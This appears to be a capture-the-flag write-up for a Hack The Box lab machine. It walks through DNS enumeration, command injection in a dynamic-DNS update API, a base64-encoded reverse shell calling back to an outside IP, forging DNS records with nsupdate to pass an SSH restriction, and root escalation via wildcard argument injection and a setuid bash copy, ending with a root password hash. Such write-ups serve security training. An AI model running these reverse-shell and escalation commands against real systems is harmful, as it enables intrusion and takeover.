@@ -1,0 +1,128 @@
+# Main points
+- DNS query: `dig`
+- DNS [Overview](https://www.cloudflare.com/learning/dns/dns-records/)
+- encode a payload in base64 and pipe to bash for RCE
+- SSH can restrict access from a specific DNS zone `*.infra.dyna.htb`
+- `nsupdate` to [#^7d4463|update DNS zones](/assets/%23%5E7d4463%7Cupdate%20DNS%20zones)
+- `command *`  can be injected for command or parameter with filename
+- `chmod +s` to set setuid bit to file, it can be elevated to owner/group
+- `bash -p` to run bash privileged
+
+# Writeup
+## Enumeration
+We start with nmap as usual
+* 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+* 53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)
+* 80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+
+Let's first start with the DNS port and query the server with a reverse lookup query with  `dig`
+`dig @10.10.10.244 -x 10.10.10.244`
+We get this
+![Pasted image 20210720013314.png](/assets/Pasted%20image%2020210720013314.png)
+So we discover these 2 hosts
+`dns1.dyna.htb` and `hostmaster.dyna.htb`
+
+let's add them to our `/etc/hosts` file and check the port 80
+we go to `http://10.10.10.244/`
+![Pasted image 20210720013627.png](/assets/Pasted%20image%2020210720013627.png)
+
+So this is a DNS service, we scroll further down
+
+![Pasted image 20210720013650.png](/assets/Pasted%20image%2020210720013650.png)
+Interesting, let's save these creds for beta mode, we see there are other domains, let's add them to our `/etc/hosts` 
+
+We see on the left it says they provide the same API as no-ip.com, so let's check [no-ip.com's  API](https://www.noip.com/integrate/request)
+
+We see there is an endpoint `/nic/update` to send an update, let's use our creds found in beta mode to `no-ip.htb`
+Let's fire up Burp Suite and catch the request to `http://no-ip.htb/nic/update` and change the `Authorization` header, as seen in the API documentation of `no-ip.com` to base64 of `username:password`
+![Pasted image 20210720181925.png](/assets/Pasted%20image%2020210720181925.png)
+We get
+![Pasted image 20210720191556.png](/assets/Pasted%20image%2020210720191556.png)
+Hmm, let's play a little with the hostname then
+This one `dyna.dynamicdns.htb` worked
+![Pasted image 20210720191841.png](/assets/Pasted%20image%2020210720191841.png)
+
+When we add `'`  to hostname we get
+![Pasted image 20210720192030.png](/assets/Pasted%20image%2020210720192030.png)
+
+So it's probably using `nsupdate` like this
+`nsupdate "$IP"`, maybe we can do command injection
+We can see
+![Pasted image 20210720192650.png](/assets/Pasted%20image%2020210720192650.png)
+
+## Foothold
+
+We have code injection. BUt we can't inject directly our reverse shell 
+```bash
+/bin/bash -l > /dev/tcp/10.10.14.127/4444 0<&1 2>&1
+```
+We can encode id in base64, and make the injection decode it and pipe it to bash
+Our base64 reverse shell
+```base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjcvNDQ0NCAwPiYxIC1uCg==
+```
+
+```
+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTI3LzQ0NDQgMDwmMSAyPiYxCg==
+```
+We trigger the RCE with
+```bash
+echo [base64 encoded payload] | base64 -d | bash
+```
+![Pasted image 20210720200112.png](/assets/Pasted%20image%2020210720200112.png)
+And we have a shell
+![Pasted image 20210720200203.png](/assets/Pasted%20image%2020210720200203.png)
+
+When we see the `/etc/passwd` file we see there are 2 users
+`dyna` and `bindmgr`
+![Pasted image 20210720200320.png](/assets/Pasted%20image%2020210720200320.png)
+
+We see in `dyna` home directory
+![Pasted image 20210720201117.png](/assets/Pasted%20image%2020210720201117.png)
+So we will probably use dyna to get root
+
+We see in `bindmgr` there is a strace file, we see there is a private SSH key but we can't connect with it, because it only accepts hosts from `*.infra.dyna.htb*`
+
+## User
+
+in `.ssh/authorized_keys`
+![Pasted image 20210720213940.png](/assets/Pasted%20image%2020210720213940.png)
+We see that our IP isn't in the DNS zone (must read more about that didnt understand everything)
+So we should update the DNS zone of `*.infra.dyna.htb` with `nsupdate` with our IP, (seen in strace), we see there are keys in `/etc/bind`
+```
+nsupdate -k infra.key
+update add pico.infra.dyna.htb 86400 A 10.10.14.127
+update add 127.14.10.10.in-addr.arpa 300 PTR pico.infra.dyna.htb
+send
+```
+
+^7d4463
+
+And se try to ssh again and it works
+![Pasted image 20210720215737.png](/assets/Pasted%20image%2020210720215737.png)
+And we have user flag, let's try to get root.
+
+# Priv Esc
+
+We run `sudo -l` and we see
+![Pasted image 20210720215922.png](/assets/Pasted%20image%2020210720215922.png)
+
+Let's check the content of this file
+![bindmgr.sh](/assets/bindmgr.sh)
+
+So this script checks if there is a file named `.version` in the current directory where it is ran and if it's different than the one in /etc/bind/named/bindmgr, if not, it exits.
+
+Then it copies everything with the command `cp .version *` to `/etc/bind/named.bindmgr`
+
+And all the files copied are owned by root, so the idea is we copy the bash binary to /tmp where we have write access, add a setuid bit to be able to elevate to the owner (which will be root), and to preserve the `s` mode, we can inject the parameter `--preserve=mode` since the command to copy is `cp *` and not `cp ./*` and run `bash -p` to run as privileged user
+
+```bash
+cp /bin/bash .
+chmod +s bash
+echo "" > "--preserve=mode"
+sudo /usr/local/bin/bindmgr.sh
+/etc/bind/named.bindmgr/bash -p
+```
+And we have root
+# Root hash
+`$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1`
